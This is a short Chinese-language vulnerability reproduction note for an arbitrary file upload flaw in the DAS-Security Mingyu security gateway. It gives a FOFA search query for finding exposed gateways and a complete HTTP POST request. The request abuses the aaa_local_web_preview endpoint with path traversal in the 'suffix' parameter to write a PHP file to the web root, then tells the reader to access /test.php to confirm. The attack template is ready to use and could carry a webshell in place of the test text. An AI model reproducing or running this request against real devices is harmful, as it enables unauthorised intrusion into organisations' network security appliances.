<a name="e6Em4"></a>
# 一、漏洞描述
```java
安恒明御安全网关是一个网络安全产品，由安恒信息技术股份有限公司开发和提供。它是一个综合性的安全管理平台，用于保护企业网络免受各种网络威胁的攻击。该产品aaa_local_web_preview端点存在文件上传漏洞。
```
<a name="YpI0q"></a>
# 一、fofa搜索语法
```java
title=="明御安全网关"
```
<a name="TNcUl"></a>
# 二、漏洞复现
```java
POST /webui/?g=aaa_local_web_preview&name=123&read=0&suffix=/../../../test.php HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: multipart/form-data; boundary=849978f98abe41119122148e4aa65b1a
Accept-Encoding: gzip
Content-Length: 200

--849978f98abe41119122148e4aa65b1a
Content-Disposition: form-data; name="123"; filename="test.php"
Content-Type: text/plain

This page has a vulnerability
--849978f98abe41119122148e4aa65b1a--
```
![image.png](https://cdn.nlark.com/yuque/0/2024/png/42988647/1719243407839-8c369c89-062a-44b8-8a46-623764d241d7.png#averageHue=%23fbfafa&clientId=ud521e60a-9dae-4&from=paste&height=563&id=u842a6683&originHeight=704&originWidth=1261&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=144461&status=done&style=none&taskId=u8e2429f2-12e0-40e6-883e-15aa75f4117&title=&width=1008.8)<br />success即代表上传成功，访问/test.php<br />![image.png](https://cdn.nlark.com/yuque/0/2024/png/42988647/1719243571952-3286098e-9bf3-4618-b1b4-76a126789c6e.png#averageHue=%23fefefe&clientId=ud521e60a-9dae-4&from=paste&height=303&id=u07ae7eb0&originHeight=379&originWidth=1310&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=11299&status=done&style=none&taskId=ub94632b7-5c27-4542-bf8f-16f9e31fc08&title=&width=1048)





